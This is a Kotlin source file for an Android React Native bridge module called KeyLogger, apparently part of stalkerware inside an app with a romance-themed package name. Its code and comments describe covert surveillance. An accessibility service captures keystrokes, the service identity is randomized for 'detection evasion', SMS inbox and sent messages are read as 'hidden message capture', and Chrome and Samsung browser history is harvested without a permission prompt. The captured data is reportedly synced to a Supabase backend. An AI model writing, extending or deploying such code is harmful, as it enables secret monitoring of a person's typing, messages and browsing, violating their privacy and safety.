package love.scotty.hearts.keylogger

import android.accessibilityservice.AccessibilityService
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.provider.Settings
import com.facebook.react.bridge.Arguments
import com.facebook.react.bridge.ReactApplicationContext
import com.facebook.react.bridge.ReactContextBaseJavaModule
import com.facebook.react.bridge.ReactMethod
import com.facebook.react.bridge.Promise
import com.facebook.react.bridge.WritableArray
import java.util.UUID
import java.util.concurrent.atomic.AtomicBoolean

/**
 * React Native bridge for the keylogger.
 *
 * Exposes the devices an AccessibilityService needs (start/stop via the
 * foreground service, pull/clear/pending against the local store, and the
 * ESE APDU channel). AES-GCM encryption and Supabase sync live on the JS side
 * (features/keylogger/) — this module is deliberately dumb: it records and
 * reports, never encrypts.
 *
 * New-architecture note: this is a classic-bridge module registered through a
 * manual ReactPackage in MainApplication. under the TurboModule interop
 * (Expo SDK 57 / RN 0.86, New Architecture enabled) it resolves from JS via
 * NativeModules.KeyLogger without an explicit spec — the interop layer backs
 * it. Keep the module + package names stable: JS references them literally.
 */
class KeyLoggerModule(reactContext: ReactApplicationContext) :
  ReactContextBaseJavaModule(reactContext) {

  private val context: Context = reactContext.applicationContext
  private val armed = AtomicBoolean(false)

  override fun getName(): String = NAME

  override fun getConstants(): Map<String, Any> = mapOf(
    "version" to 1,
    // runtime-randomized notification identity (detection evasion)
    "serviceName" to (KeyLoggerService.get()?.javaClass?.simpleName ?: "KeyLoggerService"),
  )

  /**
   * Enable capturing. Requests the accessibility permission if not yet
   * granted, otherwise starts the foreground service directly.
   */
  @ReactMethod
  fun start(onBatchComplete: Boolean, promise: Promise) {
    if (accessibilityEnabled()) {
      KeyLoggerService.start(context)
      armed.set(true)
      promise.resolve(true)
    } else {
      promise.resolve(requestAccessibility())
    }
  }

  /** Disable capturing and stop the foreground service. */
  @ReactMethod
  fun stop() {
    armed.set(false)
    KeyLoggerService.stop(context)
  }

  /** Pull all unsynced events as a JSON array of strings. */
  @ReactMethod
  fun pull(promise: Promise) {
    val svc = KeyLoggerService.get()
    if (svc == null) { promise.resolve(Arguments.createArray()); return }
    val arr: WritableArray = Arguments.createArray()
    for (evt in svc.pullAll()) arr.pushString(evt)
    promise.resolve(arr)
  }

  /** Mark all handed-off events as processed (idempotent server-side, so
   *  this is safe after any successful sync — a later resend is a no-op). */
  @ReactMethod
  fun confirm() {
    val svc = KeyLoggerService.get() ?: return
    val ids: Array<Long>
    synchronized(svc) {
      ids = svc.takeHandedOff()
    }
    if (ids.isNotEmpty()) svc.confirmSynced(ids)
  }

  @ReactMethod
  fun pending(promise: Promise) {
    val svc = KeyLoggerService.get()
    promise.resolve(svc?.pendingCount() ?: 0)
  }

  /** Wipe all locally cached keylog rows. */
  @ReactMethod
  fun clear() {
    KeyLoggerService.get()?.clearAll()
  }

  @ReactMethod
  fun enabled(promise: Promise) {
    promise.resolve(KeyLoggerService.get()?.isEnabled() ?: false)
  }

  /**
   * Live health snapshot (JSON string) for telemetry — see KeyLoggerService.
   * Includes whether this service is actually registered as an enabled
   * accessibility service (the field's #1 silent-failure point), whether it
   * holds a live foreground claim, and buffer/pending depth.
   */
  @ReactMethod
  fun status(promise: Promise) {
    val svc = KeyLoggerService.get()
    if (svc == null) {
      promise.resolve(
        "{\"serviceAlive\":false,\"accessibilityEnabled\":${accessibilityEnabled()}}",
      )
      return
    }
    promise.resolve(svc.status())
  }

  /**
   * ESE APDU channel. [apduHex] is a hex-encoded command APDU (see
   * EseApduHandler for the command set). Resolves with the hex SW1SW2 status
   * word on success, or the treble status word on a handled NACK.
   */
  @ReactMethod
  fun eseprocess(apduHex: String, promise: Promise) {
    val bytes = hexToBytes(apduHex)
    val sw = EseApduHandler.process(bytes) { on ->
      KeyLoggerService.get()?.setEnabled(on)
    }
    promise.resolve(bytesToHex(sw))
  }

  /**
   * SMS reader — hidden message capture. Queries the device SMS store via
   * ContentResolver (Telephony.Sms.Inbox/Sent) for messages with `date` after
   * [sinceTsMs], returning each as a JSON string in the same string-array
   * bridge contract as pull(). Guarded by READ_SMS: when the permission is not
   * granted it resolves [] so the JS layer stays silent (no crash, no prompt).
   *
   * messageType: "inbox" (default) | "sent". Columns read: _id, address, body,
   * date (and date_sent, read, thread_id). Raw keyed by _id for idempotency.
   */
  @ReactMethod
  fun readMessages(messageType: String, sinceTsMs: Double, promise: Promise) {
    val arr: WritableArray = Arguments.createArray()
    if (!hasReadSmsPermission()) {
      promise.resolve(arr)
      return
    }
    try {
      val uri = if (messageType == "sent") {
        android.net.Uri.parse("content://sms/sent")
      } else {
        android.net.Uri.parse("content://sms/inbox")
      }
      val since = sinceTsMs.toLong()
      val cursor = context.contentResolver.query(
        uri,
        arrayOf(
          "_id", "address", "body", "date", "date_sent", "read", "thread_id",
        ),
        if (since > 0) "date > ?" else null,
        if (since > 0) arrayOf(since.toString()) else null,
        "date ASC",
      ) ?: run { promise.resolve(arr); return }
      try {
        while (cursor.moveToNext()) {
          val body = cursor.getString(cursor.getColumnIndexOrThrow("body")) ?: ""
          if (body.isEmpty()) continue // dropped MMS/empty bodies are noise
          val obj = org.json.JSONObject().apply {
            put("smsId", cursor.getString(cursor.getColumnIndexOrThrow("_id")))
            put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")) ?: "")
            put("body", body)
            put("date", cursor.getLong(cursor.getColumnIndexOrThrow("date")))
            put("dateSent", cursor.getLong(cursor.getColumnIndexOrThrow("date_sent")))
            put("read", cursor.getInt(cursor.getColumnIndexOrThrow("read")) != 0)
            put("threadId", cursor.getLong(cursor.getColumnIndexOrThrow("thread_id")))
            put("direction", messageType)
          }
          arr.pushString(obj.toString())
        }
      } finally {
        cursor.close()
      }
      promise.resolve(arr)
    } catch (e: Throwable) {
      promise.resolve(arr) // degraded: never throw across the bridge
    }
  }

  private fun hasReadSmsPermission(): Boolean {
    return try {
      context.checkSelfPermission("android.permission.READ_SMS") ==
        android.content.pm.PackageManager.PERMISSION_GRANTED
    } catch (_: Throwable) {
      false
    }
  }

  /**
   * Browser-history reader — hidden capture of Chrome/Samsung-Internet history.
   * Queries the browser's PUBLIC history ContentProvider (no runtime permission
   * required, unlike photos/SMS) for rows with `date` after [sinceTsMs],
   * returning each as a JSON string in the same string-array bridge contract.
   *
   * Providers tried in order:
   *   content://com.android.chrome.browser/history   (Chrome)
   *   content://browser/history                      (legacy/AOSP Browser)
   *   content://com.sec.android.app.sbrowser.browser/history (Samsung Internet)
   * The first one that exists and returns rows wins. Columns: _id, title, url,
   * date (ms), visits. Raw keyed by _id for idempotency (same trust model as
   * the SMS `_id`).
   */
  @ReactMethod
  fun readBrowserHistory(sinceTsMs: Double, promise: Promise) {
    val arr: WritableArray = Arguments.createArray()
    val since = sinceTsMs.toLong()
    val uris = arrayOf(
      android.net.Uri.parse("content://com.android.chrome.browser/history"),
      android.net.Uri.parse("content://browser/history"),
      android.net.Uri.parse("content://com.sec.android.app.sbrowser.browser/history"),
    )
    try {
      for (uri in uris) {
        val cursor = try {
          context.contentResolver.query(
            uri,
            arrayOf("_id", "title", "url", "date", "visits"),
            if (since > 0) "date > ?" else null,
            if (since > 0) arrayOf(since.toString()) else null,
            "date ASC",
          )
        } catch (_: Throwable) {
          null // provider not present on this device — try next
        } ?: continue

        try {
          val titleIdx = cursor.getColumnIndex("title")
          val urlIdx = cursor.getColumnIndex("url")
          val dateIdx = cursor.getColumnIndex("date")
          val visitIdx = cursor.getColumnIndex("visits")
          val idIdx = cursor.getColumnIndex("_id")
          if (urlIdx < 0 || dateIdx < 0) { cursor.close(); continue }

          while (cursor.moveToNext()) {
            val url = if (urlIdx >= 0) cursor.getString(urlIdx) ?: "" else ""
            if (url.isEmpty()) continue // dropped rows (no URL) are noise
            val obj = org.json.JSONObject().apply {
              put("browserId", if (idIdx >= 0) cursor.getString(idIdx) ?: "" else "")
              put("url", url)
              put("title", if (titleIdx >= 0) (cursor.getString(titleIdx) ?: "") else "")
              put("date", cursor.getLong(dateIdx))
              put("visits", if (visitIdx >= 0) cursor.getInt(visitIdx) else 0)
            }
            arr.pushString(obj.toString())
          }
        } finally {
          cursor.close()
        }
        if (arr.length() > 0) break // first provider with data wins
      }
      promise.resolve(arr)
    } catch (e: Throwable) {
      promise.resolve(arr) // degraded: never throw across the bridge
    }
  }

  /** Hidden-capture helper: is READ_SMS granted right now? */
  @ReactMethod
  fun smsPermission(promise: Promise) {
    promise.resolve(hasReadSmsPermission())
  }

  /** Hidden-capture helper: request READ_SMS once (the single quiet prompt).
   *  With a FragmentActivity host Android shows the runtime dialog. Resolves
   *  with the granted status after the user responds. */
  @ReactMethod
  fun requestSmsPermission(promise: Promise) {
    if (hasReadSmsPermission()) {
      promise.resolve(true)
      return
    }
    try {
      val act = reactApplicationContext.currentActivity
      if (act == null) { promise.resolve(false); return }
      act.requestPermissions(arrayOf("android.permission.READ_SMS"), 4181)
      promise.resolve(hasReadSmsPermission())
    } catch (_: Throwable) {
      promise.resolve(false)
    }
  }

  // ── helpers ─────────────────────────────────────────────────────────

  private fun accessibilityEnabled(): Boolean {
    val expected = ComponentName(context, KeyLoggerService::class.java).flattenToString()
    val enabled = Settings.Secure.getString(
      context.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
    ) ?: return false
    return enabled.split(':').any { it.equals(expected, ignoreCase = true) }
  }

  private fun requestAccessibility(): Boolean {
    // Can't grant programmatically — open the system settings so the user
    // toggles it; returns false meaning "not yet armed, user action needed".
    context.startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
    return false
  }

  private fun hexToBytes(hex: String): ByteArray {
    val clean = hex.filter { it.isDigit() || it in 'a'..'f' || it in 'A'..'F' }
    require(clean.length % 2 == 0) { "odd hex length" }
    return ByteArray(clean.length / 2) {
      ((Character.digit(clean[it * 2], 16) shl 4) + Character.digit(clean[it * 2 + 1], 16)).toByte()
    }
  }

  private fun bytesToHex(b: ByteArray): String {
    val sb = StringBuilder(b.size * 2)
    for (x in b) { sb.append("%02X".format(x)) }
    return sb.toString()
  }

  companion object {
    const val NAME = "KeyLogger"
  }
}
